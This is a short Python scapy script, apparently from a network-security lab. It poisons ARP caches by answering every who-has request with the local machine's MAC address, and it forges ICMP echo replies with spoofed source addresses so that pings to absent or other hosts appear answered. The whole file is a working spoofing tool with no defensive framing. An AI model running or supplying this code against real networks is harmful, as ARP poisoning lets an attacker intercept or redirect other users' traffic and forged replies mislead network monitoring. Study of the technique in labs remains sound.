from scapy.all import *

INTERFACE = "your interface addrs"

ip_src = None

def send_spoof_pkt(pkt):    
    echo = pkt[ICMP]
    payload = pkt[Raw].load if Raw in pkt else b''
    spoof = IP(dst=pkt[IP].src, src=ip_src) / ICMP(type=0, id=echo.id, seq=echo.seq) / payload
    
    send(spoof, verbose=False)
    return None

# If the IP is unknown spoof with the src IP addrs
# It assumes that the src from ping is a valid IP and use it as the src to send the answer
def get_valid_ip(pkt):
    global ip_src
    
    if pkt[ARP].op == 1: # who-has
        send(ARP(
            op = 2,
            psrc = pkt[ARP].pdst,
            hwsrc = get_if_hwaddr(INTERFACE),
            pdst = pkt[ARP].psrc,
            hwdst = pkt[ARP].hwsrc
        ))
        
        ip_src = pkt[ARP].psrc
        return None
        

sniffer_arp = AsyncSniffer(iface=INTERFACE, filter='arp', prn=get_valid_ip)
sniffer_icmp = AsyncSniffer(iface=INTERFACE, filter='icmp[icmptype]=8', prn=lambda pkt: send_spoof_pkt(pkt)) # icmptype = 8 is the echo request

sniffer_arp.start()
sniffer_icmp.start()

sniffer_arp.join()
sniffer_icmp.join()


